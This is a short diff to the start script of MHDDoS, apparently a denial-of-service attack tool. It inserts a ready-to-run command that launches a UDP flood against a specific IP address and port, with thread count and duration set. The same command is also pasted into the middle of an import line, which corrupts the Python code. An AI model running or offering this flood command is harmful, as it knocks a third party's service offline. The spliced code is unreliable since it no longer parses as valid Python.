@@ -1,8 +1,9 @@
+python3 /workspaces/MHDDoS/start.py UDP 143.92.115.133:10018 54 9999
 #!/usr/bin/env python3
  
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from contextlib import suppress
-from itertools import cycle
+from itertools impopython3 /workspaces/MHDDoS/start.py UDP 143.92.115.133:10018 54 9999rt cycle
 from json import load
 from logging import basicConfig, getLogger, shutdown
 from math import log2, trunc
